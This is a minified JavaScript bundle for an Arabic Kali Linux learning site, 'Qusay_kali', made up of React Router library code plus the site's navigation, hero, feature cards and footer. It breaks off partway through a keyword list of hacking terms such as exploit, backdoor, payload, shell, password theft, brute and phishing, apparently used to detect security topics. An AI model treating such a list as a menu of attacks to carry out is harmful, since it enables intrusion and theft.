    return t ? n.map((r, o) => (o === n.length - 1 ? r.pathname : r.pathnameBase)) : n.map((r) => r.pathnameBase);
}
function sy(e, t, n, r) {
    r === void 0 && (r = !1);
    let o;
    typeof e == "string"
        ? (o = bo(e))
        : ((o = xs({}, e)),
          xe(!o.pathname || !o.pathname.includes("?"), yl("?", "pathname", "search", o)),
          xe(!o.pathname || !o.pathname.includes("#"), yl("#", "pathname", "hash", o)),
          xe(!o.search || !o.search.includes("#"), yl("#", "search", "hash", o)));
    let s = e === "" || o.pathname === "",
        i = s ? "/" : o.pathname,
        a;
    if (i == null) a = n;
    else {
        let p = t.length - 1;
        if (!r && i.startsWith("..")) {
            let m = i.split("/");
            for (; m[0] === ".."; ) m.shift(), (p -= 1);
            o.pathname = m.join("/");
        }
        a = p >= 0 ? t[p] : "/";
    }
    let l = sb(o, a),
        u = i && i !== "/" && i.endsWith("/"),
        d = (s || i === ".") && n.endsWith("/");
    return !l.pathname.endsWith("/") && (u || d) && (l.pathname += "/"), l;
}
const In = (e) => e.join("/").replace(/\/\/+/g, "/"),
    lb = (e) => e.replace(/\/+$/, "").replace(/^\/*/, "/"),
    cb = (e) => (!e || e === "?" ? "" : e.startsWith("?") ? e : "?" + e),
    ub = (e) => (!e || e === "#" ? "" : e.startsWith("#") ? e : "#" + e);
function db(e) {
    return (
        e != null &&
        typeof e.status == "number" &&
        typeof e.statusText == "string" &&
        typeof e.internal == "boolean" &&
        "data" in e
    );
}
const iy = ["post", "put", "patch", "delete"];
new Set(iy);
const pb = ["get", ...iy];
new Set(pb);
/**
 * React Router v6.30.1
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */ function ws() {
    return (
        (ws = Object.assign
            ? Object.assign.bind()
            : function (e) {
                  for (var t = 1; t < arguments.length; t++) {
                      var n = arguments[t];
                      for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
                  }
                  return e;
              }),
        ws.apply(this, arguments)
    );
}
const Qu = x.createContext(null),
    fb = x.createContext(null),
    vr = x.createContext(null),
    ja = x.createContext(null),
    xr = x.createContext({ outlet: null, matches: [], isDataRoute: !1 }),
    ay = x.createContext(null);
function mb(e, t) {
    let { relative: n } = t === void 0 ? {} : t;
    Ms() || xe(!1);
    let { basename: r, navigator: o } = x.useContext(vr),
        { hash: s, pathname: i, search: a } = cy(e, { relative: n }),
        l = i;
    return r !== "/" && (l = i === "/" ? r : In([r, i])), o.createHref({ pathname: l, search: a, hash: s });
}
function Ms() {
    return x.useContext(ja) != null;
}
function ko() {
    return Ms() || xe(!1), x.useContext(ja).location;
}
function ly(e) {
    x.useContext(vr).static || x.useLayoutEffect(e);
}
function hb() {
    let { isDataRoute: e } = x.useContext(xr);
    return e ? Tb() : gb();
}
function gb() {
    Ms() || xe(!1);
    let e = x.useContext(Qu),
        { basename: t, future: n, navigator: r } = x.useContext(vr),
        { matches: o } = x.useContext(xr),
        { pathname: s } = ko(),
        i = JSON.stringify(oy(o, n.v7_relativeSplatPath)),
        a = x.useRef(!1);
    return (
        ly(() => {
            a.current = !0;
        }),
        x.useCallback(
            function (u, d) {
                if ((d === void 0 && (d = {}), !a.current)) return;
                if (typeof u == "number") {
                    r.go(u);
                    return;
                }
                let p = sy(u, JSON.parse(i), s, d.relative === "path");
                e == null && t !== "/" && (p.pathname = p.pathname === "/" ? t : In([t, p.pathname])),
                    (d.replace ? r.replace : r.push)(p, d.state, d);
            },
            [t, r, i, s, e]
        )
    );
}
function cy(e, t) {
    let { relative: n } = t === void 0 ? {} : t,
        { future: r } = x.useContext(vr),
        { matches: o } = x.useContext(xr),
        { pathname: s } = ko(),
        i = JSON.stringify(oy(o, r.v7_relativeSplatPath));
    return x.useMemo(() => sy(e, JSON.parse(i), s, n === "path"), [e, i, s, n]);
}
function yb(e, t) {
    return vb(e, t);
}
function vb(e, t, n, r) {
    Ms() || xe(!1);
    let { navigator: o } = x.useContext(vr),
        { matches: s } = x.useContext(xr),
        i = s[s.length - 1],
        a = i ? i.params : {};
    i && i.pathname;
    let l = i ? i.pathnameBase : "/";
    i && i.route;
    let u = ko(),
        d;
    if (t) {
        var p;
        let w = typeof t == "string" ? bo(t) : t;
        l === "/" || ((p = w.pathname) != null && p.startsWith(l)) || xe(!1), (d = w);
    } else d = u;
    let m = d.pathname || "/",
        f = m;
    if (l !== "/") {
        let w = l.replace(/^\//, "").split("/");
        f = "/" + m.replace(/^\//, "").split("/").slice(w.length).join("/");
    }
    let S = WS(e, { pathname: f }),
        v = kb(
            S &&
                S.map((w) =>
                    Object.assign({}, w, {
                        params: Object.assign({}, a, w.params),
                        pathname: In([l, o.encodeLocation ? o.encodeLocation(w.pathname).pathname : w.pathname]),
                        pathnameBase:
                            w.pathnameBase === "/"
                                ? l
                                : In([
                                      l,
                                      o.encodeLocation ? o.encodeLocation(w.pathnameBase).pathname : w.pathnameBase,
                                  ]),
                    })
                ),
            s,
            n,
            r
        );
    return t && v
        ? x.createElement(
              ja.Provider,
              {
                  value: {
                      location: ws({ pathname: "/", search: "", hash: "", state: null, key: "default" }, d),
                      navigationType: Pn.Pop,
                  },
              },
              v
          )
        : v;
}
function xb() {
    let e = Pb(),
        t = db(e) ? e.status + " " + e.statusText : e instanceof Error ? e.message : JSON.stringify(e),
        n = e instanceof Error ? e.stack : null,
        o = { padding: "0.5rem", backgroundColor: "rgba(200,200,200, 0.5)" };
    return x.createElement(
        x.Fragment,
        null,
        x.createElement("h2", null, "Unexpected Application Error!"),
        x.createElement("h3", { style: { fontStyle: "italic" } }, t),
        n ? x.createElement("pre", { style: o }, n) : null,
        null
    );
}
const wb = x.createElement(xb, null);
class Sb extends x.Component {
    constructor(t) {
        super(t), (this.state = { location: t.location, revalidation: t.revalidation, error: t.error });
    }
    static getDerivedStateFromError(t) {
        return { error: t };
    }
    static getDerivedStateFromProps(t, n) {
        return n.location !== t.location || (n.revalidation !== "idle" && t.revalidation === "idle")
            ? { error: t.error, location: t.location, revalidation: t.revalidation }
            : {
                  error: t.error !== void 0 ? t.error : n.error,
                  location: n.location,
                  revalidation: t.revalidation || n.revalidation,
              };
    }
    componentDidCatch(t, n) {
        console.error("React Router caught the following error during render", t, n);
    }
    render() {
        return this.state.error !== void 0
            ? x.createElement(
                  xr.Provider,
                  { value: this.props.routeContext },
                  x.createElement(ay.Provider, { value: this.state.error, children: this.props.component })
              )
            : this.props.children;
    }
}
function bb(e) {
    let { routeContext: t, match: n, children: r } = e,
        o = x.useContext(Qu);
    return (
        o &&
            o.static &&
            o.staticContext &&
            (n.route.errorElement || n.route.ErrorBoundary) &&
            (o.staticContext._deepestRenderedBoundaryId = n.route.id),
        x.createElement(xr.Provider, { value: t }, r)
    );
}
function kb(e, t, n, r) {
    var o;
    if ((t === void 0 && (t = []), n === void 0 && (n = null), r === void 0 && (r = null), e == null)) {
        var s;
        if (!n) return null;
        if (n.errors) e = n.matches;
        else if ((s = r) != null && s.v7_partialHydration && t.length === 0 && !n.initialized && n.matches.length > 0)
            e = n.matches;
        else return null;
    }
    let i = e,
        a = (o = n) == null ? void 0 : o.errors;
    if (a != null) {
        let d = i.findIndex((p) => p.route.id && (a == null ? void 0 : a[p.route.id]) !== void 0);
        d >= 0 || xe(!1), (i = i.slice(0, Math.min(i.length, d + 1)));
    }
    let l = !1,
        u = -1;
    if (n && r && r.v7_partialHydration)
        for (let d = 0; d < i.length; d++) {
            let p = i[d];
            if (((p.route.HydrateFallback || p.route.hydrateFallbackElement) && (u = d), p.route.id)) {
                let { loaderData: m, errors: f } = n,
                    S = p.route.loader && m[p.route.id] === void 0 && (!f || f[p.route.id] === void 0);
                if (p.route.lazy || S) {
                    (l = !0), u >= 0 ? (i = i.slice(0, u + 1)) : (i = [i[0]]);
                    break;
                }
            }
        }
    return i.reduceRight((d, p, m) => {
        let f,
            S = !1,
            v = null,
            w = null;
        n &&
            ((f = a && p.route.id ? a[p.route.id] : void 0),
            (v = p.route.errorElement || wb),
            l &&
                (u < 0 && m === 0
                    ? ((S = !0), (w = null))
                    : u === m && ((S = !0), (w = p.route.hydrateFallbackElement || null))));
        let g = t.concat(i.slice(0, m + 1)),
            h = () => {
                let y;
                return (
                    f
                        ? (y = v)
                        : S
                          ? (y = w)
                          : p.route.Component
                            ? (y = x.createElement(p.route.Component, null))
                            : p.route.element
                              ? (y = p.route.element)
                              : (y = d),
                    x.createElement(bb, {
                        match: p,
                        routeContext: { outlet: d, matches: g, isDataRoute: n != null },
                        children: y,
                    })
                );
            };
        return n && (p.route.ErrorBoundary || p.route.errorElement || m === 0)
            ? x.createElement(Sb, {
                  location: n.location,
                  revalidation: n.revalidation,
                  component: v,
                  error: f,
                  children: h(),
                  routeContext: { outlet: null, matches: g, isDataRoute: !0 },
              })
            : h();
    }, null);
}
var uy = (function (e) {
        return (
            (e.UseBlocker = "useBlocker"),
            (e.UseRevalidator = "useRevalidator"),
            (e.UseNavigateStable = "useNavigate"),
            e
        );
    })(uy || {}),
    ta = (function (e) {
        return (
            (e.UseBlocker = "useBlocker"),
            (e.UseLoaderData = "useLoaderData"),
            (e.UseActionData = "useActionData"),
            (e.UseRouteError = "useRouteError"),
            (e.UseNavigation = "useNavigation"),
            (e.UseRouteLoaderData = "useRouteLoaderData"),
            (e.UseMatches = "useMatches"),
            (e.UseRevalidator = "useRevalidator"),
            (e.UseNavigateStable = "useNavigate"),
            (e.UseRouteId = "useRouteId"),
            e
        );
    })(ta || {});
function Cb(e) {
    let t = x.useContext(Qu);
    return t || xe(!1), t;
}
function Eb(e) {
    let t = x.useContext(fb);
    return t || xe(!1), t;
}
function Nb(e) {
    let t = x.useContext(xr);
    return t || xe(!1), t;
}
function dy(e) {
    let t = Nb(),
        n = t.matches[t.matches.length - 1];
    return n.route.id || xe(!1), n.route.id;
}
function Pb() {
    var e;
    let t = x.useContext(ay),
        n = Eb(ta.UseRouteError),
        r = dy(ta.UseRouteError);
    return t !== void 0 ? t : (e = n.errors) == null ? void 0 : e[r];
}
function Tb() {
    let { router: e } = Cb(uy.UseNavigateStable),
        t = dy(ta.UseNavigateStable),
        n = x.useRef(!1);
    return (
        ly(() => {
            n.current = !0;
        }),
        x.useCallback(
            function (o, s) {
                s === void 0 && (s = {}),
                    n.current && (typeof o == "number" ? e.navigate(o) : e.navigate(o, ws({ fromRouteId: t }, s)));
            },
            [e, t]
        )
    );
}
function jb(e, t) {
    e == null || e.v7_startTransition, e == null || e.v7_relativeSplatPath;
}
function Wt(e) {
    xe(!1);
}
function Rb(e) {
    let {
        basename: t = "/",
        children: n = null,
        location: r,
        navigationType: o = Pn.Pop,
        navigator: s,
        static: i = !1,
        future: a,
    } = e;
    Ms() && xe(!1);
    let l = t.replace(/^\/*/, "/"),
        u = x.useMemo(
            () => ({ basename: l, navigator: s, static: i, future: ws({ v7_relativeSplatPath: !1 }, a) }),
            [l, a, s, i]
        );
    typeof r == "string" && (r = bo(r));
    let { pathname: d = "/", search: p = "", hash: m = "", state: f = null, key: S = "default" } = r,
        v = x.useMemo(() => {
            let w = Ku(d, l);
            return w == null
                ? null
                : { location: { pathname: w, search: p, hash: m, state: f, key: S }, navigationType: o };
        }, [l, d, p, m, f, S, o]);
    return v == null
        ? null
        : x.createElement(vr.Provider, { value: u }, x.createElement(ja.Provider, { children: n, value: v }));
}
function Ab(e) {
    let { children: t, location: n } = e;
    return yb(Rc(t), n);
}
new Promise(() => {});
function Rc(e, t) {
    t === void 0 && (t = []);
    let n = [];
    return (
        x.Children.forEach(e, (r, o) => {
            if (!x.isValidElement(r)) return;
            let s = [...t, o];
            if (r.type === x.Fragment) {
                n.push.apply(n, Rc(r.props.children, s));
                return;
            }
            r.type !== Wt && xe(!1), !r.props.index || !r.props.children || xe(!1);
            let i = {
                id: r.props.id || s.join("-"),
                caseSensitive: r.props.caseSensitive,
                element: r.props.element,
                Component: r.props.Component,
                index: r.props.index,
                path: r.props.path,
                loader: r.props.loader,
                action: r.props.action,
                errorElement: r.props.errorElement,
                ErrorBoundary: r.props.ErrorBoundary,
                hasErrorBoundary: r.props.ErrorBoundary != null || r.props.errorElement != null,
                shouldRevalidate: r.props.shouldRevalidate,
                handle: r.props.handle,
                lazy: r.props.lazy,
            };
            r.props.children && (i.children = Rc(r.props.children, s)), n.push(i);
        }),
        n
    );
}
/**
 * React Router DOM v6.30.1
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */ function Ac() {
    return (
        (Ac = Object.assign
            ? Object.assign.bind()
            : function (e) {
                  for (var t = 1; t < arguments.length; t++) {
                      var n = arguments[t];
                      for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
                  }
                  return e;
              }),
        Ac.apply(this, arguments)
    );
}
function Mb(e, t) {
    if (e == null) return {};
    var n = {},
        r = Object.keys(e),
        o,
        s;
    for (s = 0; s < r.length; s++) (o = r[s]), !(t.indexOf(o) >= 0) && (n[o] = e[o]);
    return n;
}
function _b(e) {
    return !!(e.metaKey || e.altKey || e.ctrlKey || e.shiftKey);
}
function Lb(e, t) {
    return e.button === 0 && (!t || t === "_self") && !_b(e);
}
const Ob = [
        "onClick",
        "relative",
        "reloadDocument",
        "replace",
        "state",
        "target",
        "to",
        "preventScrollReset",
        "viewTransition",
    ],
    Ib = "6";
try {
    window.__reactRouterVersion = Ib;
} catch {}
const Db = "startTransition",
    Xp = bf[Db];
function zb(e) {
    let { basename: t, children: n, future: r, window: o } = e,
        s = x.useRef();
    s.current == null && (s.current = HS({ window: o, v5Compat: !0 }));
    let i = s.current,
        [a, l] = x.useState({ action: i.action, location: i.location }),
        { v7_startTransition: u } = r || {},
        d = x.useCallback(
            (p) => {
                u && Xp ? Xp(() => l(p)) : l(p);
            },
            [l, u]
        );
    return (
        x.useLayoutEffect(() => i.listen(d), [i, d]),
        x.useEffect(() => jb(r), [r]),
        x.createElement(Rb, {
            basename: t,
            children: n,
            location: a.location,
            navigationType: a.action,
            navigator: i,
            future: r,
        })
    );
}
const Fb = typeof window < "u" && typeof window.document < "u" && typeof window.document.createElement < "u",
    Ub = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,
    Zt = x.forwardRef(function (t, n) {
        let {
                onClick: r,
                relative: o,
                reloadDocument: s,
                replace: i,
                state: a,
                target: l,
                to: u,
                preventScrollReset: d,
                viewTransition: p,
            } = t,
            m = Mb(t, Ob),
            { basename: f } = x.useContext(vr),
            S,
            v = !1;
        if (typeof u == "string" && Ub.test(u) && ((S = u), Fb))
            try {
                let y = new URL(window.location.href),
                    b = u.startsWith("//") ? new URL(y.protocol + u) : new URL(u),
                    k = Ku(b.pathname, f);
                b.origin === y.origin && k != null ? (u = k + b.search + b.hash) : (v = !0);
            } catch {}
        let w = mb(u, { relative: o }),
            g = $b(u, { replace: i, state: a, target: l, preventScrollReset: d, relative: o, viewTransition: p });
        function h(y) {
            r && r(y), y.defaultPrevented || g(y);
        }
        return x.createElement("a", Ac({}, m, { href: S || w, onClick: v || s ? r : h, ref: n, target: l }));
    });
var Yp;
(function (e) {
    (e.UseScrollRestoration = "useScrollRestoration"),
        (e.UseSubmit = "useSubmit"),
        (e.UseSubmitFetcher = "useSubmitFetcher"),
        (e.UseFetcher = "useFetcher"),
        (e.useViewTransitionState = "useViewTransitionState");
})(Yp || (Yp = {}));
var Zp;
(function (e) {
    (e.UseFetcher = "useFetcher"), (e.UseFetchers = "useFetchers"), (e.UseScrollRestoration = "useScrollRestoration");
})(Zp || (Zp = {}));
function $b(e, t) {
    let {
            target: n,
            replace: r,
            state: o,
            preventScrollReset: s,
            relative: i,
            viewTransition: a,
        } = t === void 0 ? {} : t,
        l = hb(),
        u = ko(),
        d = cy(e, { relative: i });
    return x.useCallback(
        (p) => {
            if (Lb(p, n)) {
                p.preventDefault();
                let m = r !== void 0 ? r : ea(u) === ea(d);
                l(e, { replace: m, state: o, preventScrollReset: s, relative: i, viewTransition: a });
            }
        },
        [u, l, d, r, o, n, e, s, i, a]
    );
}
const py = x.createContext(void 0);
function Hb({ children: e }) {
    const [t, n] = x.useState(() => localStorage.getItem("theme") || "dark");
    x.useEffect(() => {
        const o = window.document.documentElement;
        o.classList.remove("light", "dark"), o.classList.add(t), localStorage.setItem("theme", t);
    }, [t]);
    const r = () => {
        n((o) => (o === "dark" ? "light" : "dark"));
    };
    return c.jsx(py.Provider, { value: { theme: t, toggleTheme: r, setTheme: n }, children: e });
}
function Bb() {
    const e = x.useContext(py);
    if (e === void 0) throw new Error("useTheme must be used within a ThemeProvider");
    return e;
}
const Jp = () => {
        const { theme: e, toggleTheme: t } = Bb();
        return c.jsx("button", {
            onClick: t,
            className:
                "w-10 h-10 rounded-xl bg-secondary border border-border/50 flex items-center justify-center hover:border-primary/50 hover:bg-primary/10 transition-all duration-300",
            "aria-label": e === "dark" ? "Switch to light mode" : "Switch to dark mode",
            children:
                e === "dark"
                    ? c.jsx(px, { className: "w-5 h-5 text-muted-foreground hover:text-primary transition-colors" })
                    : c.jsx(ax, { className: "w-5 h-5 text-muted-foreground hover:text-primary transition-colors" }),
        });
    },
    ef = [
        { label: "الرئيسية", path: "/" },
        { label: "الدليل الكامل", path: "/guide" },
        { label: "ادوات كالي", path: "/tools" },
        { label: "السكربتات", path: "/scripts" },
        { label: "الذكاء الاصطناعي", path: "/ai" },
        { label: " اوامر كالي لينكس", path: "/cc" },
        { label: "تنزيل كالي", path: "/download" },
    ],
    wr = () => {
        const [e, t] = x.useState(!1),
            n = ko();
        return c.jsx("nav", {
            className: "fixed top-0 left-0 right-0 z-50 bg-background/80 backdrop-blur-xl border-b border-border/30",
            children: c.jsxs("div", {
                className: "container mx-auto px-4",
                children: [
                    c.jsxs("div", {
                        className: "flex items-center justify-between h-16",
                        children: [
                            c.jsxs(Zt, {
                                to: "/",
                                className: "flex items-center gap-3 group",
                                children: [
                                    c.jsx("div", {
                                        className:
                                            "w-10 h-10 rounded-xl bg-primary/20 border border-primary/40 flex items-center justify-center group-hover:box-glow transition-all duration-300",
                                        children: c.jsx("span", {
                                            className: "text-primary font-bold text-xl",
                                            children: "Q",
                                        }),
                                    }),
                                    c.jsx("span", {
                                        className: "text-primary font-bold text-xl text-glow-sm",
                                        children: "Qusay_kali",
                                    }),
                                ],
                            }),
                            c.jsx("div", {
                                className: "hidden lg:flex items-center gap-1",
                                children: ef.map((r) =>
                                    c.jsx(
                                        Zt,
                                        {
                                            to: r.path,
                                            className: n.pathname === r.path ? "nav-link-active" : "nav-link",
                                            children: r.label,
                                        },
                                        r.path
                                    )
                                ),
                            }),
                            c.jsx("div", { className: "hidden lg:flex items-center gap-4", children: c.jsx(Jp, {}) }),
                            c.jsxs("div", {
                                className: "lg:hidden flex items-center gap-2",
                                children: [
                                    c.jsx(Jp, {}),
                                    c.jsx("button", {
                                        onClick: () => t(!e),
                                        className:
                                            "w-10 h-10 rounded-xl bg-secondary border border-border/50 flex items-center justify-center",
                                        children: e
                                            ? c.jsx(_u, { className: "w-5 h-5 text-primary" })
                                            : c.jsx(ix, { className: "w-5 h-5 text-primary" }),
                                    }),
                                ],
                            }),
                        ],
                    }),
                    e &&
                        c.jsx("div", {
                            className: "lg:hidden py-4 border-t border-border/30 animate-fade-in",
                            children: c.jsx("div", {
                                className: "flex flex-col gap-2",
                                children: ef.map((r) =>
                                    c.jsx(
                                        Zt,
                                        {
                                            to: r.path,
                                            onClick: () => t(!1),
                                            className:
                                                n.pathname === r.path
                                                    ? "nav-link-active text-center"
                                                    : "nav-link text-center",
                                            children: r.label,
                                        },
                                        r.path
                                    )
                                ),
                            }),
                        }),
                ],
            }),
        });
    },
    Vb = () =>
        c.jsxs("section", {
            className:
                "relative min-h-screen flex items-center justify-center gradient-cyber-bg cyber-grid overflow-hidden",
            children: [
                c.jsx("div", {
                    className:
                        "absolute top-1/4 left-1/2 -translate-x-1/2 w-[600px] h-[600px] bg-primary/10 rounded-full blur-[150px] pointer-events-none",
                }),
                c.jsx("div", {
                    className:
                        "absolute bottom-0 left-1/2 -translate-x-1/2 w-[400px] h-[200px] bg-primary/5 rounded-full blur-[100px] pointer-events-none",
                }),
                c.jsxs("div", {
                    className: "container mx-auto px-4 py-32 text-center relative z-10",
                    children: [
                        c.jsx("div", {
                            className: "flex justify-center mb-8 animate-float",
                            children: c.jsx("div", {
                                className: "cyber-icon-box",
                                children: c.jsx(fo, { className: "w-10 h-10 text-primary" }),
                            }),
                        }),
                        c.jsx("h1", {
                            className:
                                "text-5xl md:text-7xl lg:text-8xl font-bold text-primary text-glow mb-6 animate-fade-in",
                            children: "Qusay_kali",
                        }),
                        c.jsx("p", {
                            className:
                                "text-xl md:text-2xl text-muted-foreground mb-4 animate-fade-in [animation-delay:0.2s]",
                            children: "منصة احترافية متخصصة في الأمن السيبراني",
                        }),
                        c.jsx("p", {
                            className: "text-lg text-muted-foreground/70 mb-10 animate-fade-in [animation-delay:0.3s]",
                            children: "ذكاء اصطناعي • Ai (Qusay_kali)",
                        }),
                        c.jsxs("div", {
                            className:
                                "flex flex-col sm:flex-row gap-4 justify-center animate-fade-in [animation-delay:0.4s]",
                            children: [
                                c.jsx(Zt, {
                                    to: "/ai",
                                    className: "cyber-button-primary",
                                    children: "ابدأ مع الذكاء الاصطناعي",
                                }),
                                c.jsx(Zt, {
                                    to: "/cc",
                                    className: "cyber-button-outline",
                                    children: " تصفح الاوامر",
                                }),
                            ],
                        }),
                    ],
                }),
            ],
        }),
    Wb = [
        {
            icon: ng,
            title: "ذكاء اصطناعي متخصص",
            description: "(كلمة السر بالانستا) AI متقدم متخصص في الأمن السيبراني يجيب على جميع استفساراتك بدقة وسرعة",
            link: "/ai",
        },
        { icon: rg, title: " اوامر كالي لينكس", description: " اوامر كالي لينكس الاساسية   ", link: "/cc" },
        {
            icon: fr,
            title: "أدوات كالي لينكس",
            description: "20 شرح بالعربي لكل اداة   ",
            link: "/tools",
        },
        { icon: Mu, title: "السكربتات الجاهزة", description: "   :   python .. c++ .. bash   ", link: "/scripts" },
        {
            icon: gc,
            title: "الدليل الكامل",
            description: "الدليل الكامل للأمن السيبراني",
            link: "/guide",
        },
        {
            icon: Qi,
            title: "تنزيل كالي لينكس",
            description: "روابط تنزيل مباشرة لجميع إصدارات Kali Linux مع شرح التثبيت",
            link: "/download",
        },
    ],
    Kb = () =>
        c.jsxs("section", {
            className: "py-24 bg-background relative",
            children: [
                c.jsx("div", {
                    className:
                        "absolute top-0 left-1/2 -translate-x-1/2 w-[800px] h-[400px] bg-primary/5 rounded-full blur-[150px] pointer-events-none",
                }),
                c.jsxs("div", {
                    className: "container mx-auto px-4 relative z-10",
                    children: [
                        c.jsx("h2", {
                            className: "text-3xl md:text-4xl font-bold text-primary text-center mb-16 text-glow-sm",
                            children: "ميزات المنصة",
                        }),
                        c.jsx("div", {
                            className: "grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6",
                            children: Wb.map((e, t) =>
                                c.jsxs(
                                    Zt,
                                    {
                                        to: e.link,
                                        className: "cyber-card p-6 group",
                                        style: { animationDelay: `${t * 0.1}s` },
                                        children: [
                                            c.jsx("div", {
                                                className:
                                                    "mb-4 transition-transform duration-300 group-hover:scale-110",
                                                children: c.jsx("div", {
                                                    className:
                                                        "w-12 h-12 rounded-xl bg-primary/10 border border-primary/30 flex items-center justify-center group-hover:box-glow-sm transition-all duration-300",
                                                    children: c.jsx(e.icon, { className: "w-6 h-6 text-primary" }),
                                                }),
                                            }),
                                            c.jsx("h3", {
                                                className:
                                                    "text-xl font-bold text-primary mb-3 group-hover:text-glow-sm transition-all duration-300",
                                                children: e.title,
                                            }),
                                            c.jsx("p", {
                                                className: "text-muted-foreground text-sm leading-relaxed",
                                                children: e.description,
                                            }),
                                        ],
                                    },
                                    t
                                )
                            ),
                        }),
                    ],
                }),
            ],
        }),
    Qb = () =>
        c.jsxs("section", {
            className: "py-24 relative overflow-hidden",
            children: [
                c.jsx("div", {
                    className:
                        "absolute inset-0 bg-gradient-to-b from-background via-primary/5 to-background pointer-events-none",
                }),
                c.jsxs("div", {
                    className: "container mx-auto px-4 text-center relative z-10",
                    children: [
                        c.jsx("h2", {
                            className: "text-3xl md:text-4xl font-bold text-primary mb-4 text-glow-sm",
                            children: "ابدأ رحلتك في الأمن السيبراني الآن",
                        }),
                        c.jsx("p", { className: "text-muted-foreground text-lg mb-10", children: "100% الموقع مجاني" }),
                        c.jsxs("div", {
                            className: "flex flex-col sm:flex-row gap-4 justify-center",
                            children: [
                                c.jsx(Zt, {
                                    to: "/guide",
                                    className: "cyber-button-primary",
                                    children: "الدليل الكامل",
                                }),
                                c.jsx(Zt, {
                                    to: "/tools",
                                    className: "cyber-button-outline",
                                    children: "تصفح الأدوات",
                                }),
                            ],
                        }),
                    ],
                }),
            ],
        }),
    Sr = () =>
        c.jsx("footer", {
            className: "py-12 border-t border-border/30 bg-background",
            children: c.jsx("div", {
                className: "container mx-auto px-4",
                children: c.jsxs("div", {
                    className: "flex flex-col md:flex-row items-center justify-between gap-6",
                    children: [
                        c.jsxs(Zt, {
                            to: "/",
                            className: "flex items-center gap-3 group",
                            children: [
                                c.jsx("div", {
                                    className:
                                        "w-10 h-10 rounded-xl bg-primary/20 border border-primary/40 flex items-center justify-center",
                                    children: c.jsx("span", {
                                        className: "text-primary font-bold text-xl",
                                        children: "Q",
                                    }),
                                }),
                                c.jsx("span", { className: "text-primary font-bold text-xl", children: "Qusay_kali" }),
                            ],
                        }),
                        c.jsx("p", {
                            className: "text-muted-foreground text-sm",
                            children: "© 2025 Qusay_kali. جميع الحقوق محفوظة",
                        }),
                        c.jsxs("div", {
                            className: "flex items-center gap-4",
                            children: [
                                c.jsx("a", {
                                    href: "https://www.instagram.com/qusay_kali1/",
                                    target: "_blank",
                                    rel: "noopener noreferrer",
                                    className:
                                        "w-10 h-10 rounded-xl bg-secondary border border-border/50 flex items-center justify-center hover:border-primary/50 hover:bg-primary/10 transition-all duration-300",
                                    "aria-label": "Instagram",
                                    children: c.jsx("svg", {
                                        className: "w-5 h-5 text-muted-foreground",
                                        fill: "currentColor",
                                        viewBox: "0 0 24 24",
                                        children: c.jsx("path", {
                                            d: "M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z",
                                        }),
                                    }),
                                }),
                                c.jsx("a", {
                                    href: "https://www.youtube.com/@Qusay_kali",
                                    target: "_blank",
                                    rel: "noopener noreferrer",
                                    className:
                                        "w-10 h-10 rounded-xl bg-secondary border border-border/50 flex items-center justify-center hover:border-primary/50 hover:bg-primary/10 transition-all duration-300",
                                    "aria-label": "YouTube",
                                    children: c.jsx("svg", {
                                        className: "w-5 h-5 text-muted-foreground",
                                        fill: "currentColor",
                                        viewBox: "0 0 24 24",
                                        children: c.jsx("path", {
                                            d: "M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z",
                                        }),
                                    }),
                                }),
                            ],
                        }),
                    ],
                }),
            }),
        }),
    Gb = () =>
        c.jsxs("div", {
            className: "min-h-screen bg-background",
            children: [
                c.jsx(wr, {}),
                c.jsxs("main", { children: [c.jsx(Vb, {}), c.jsx(Kb, {}), c.jsx(Qb, {})] }),
                c.jsx(Sr, {}),
            ],
        }),
    qb = [
        "اختراق",
        "هاك",
        "hack",
        "exploit",
        "ثغرة",
        "password",
        "كلمة مرور",
        "سرقة",
        "ddos",
        "attack",
        "هجوم",
        "malware",
        "فيروس",
        "ransomware",
        "backdoor",
        "payload",
        "shell",
        "root",
        "admin",
        "injection",
        "حقن",
        "bypass",
        "تجاوز",
        "brute",
        "crack",
        "كسر",
        "decrypt",
        "فك تشفير",
        "wifi",
        "واي فاي",
        "network",
        "شبكة",
        "server",
        "سيرفر",
        "database",
        "قاعدة بيانات",
        "sql",
        "xss",
        "csrf",
        "phishing",
        "تصيد",
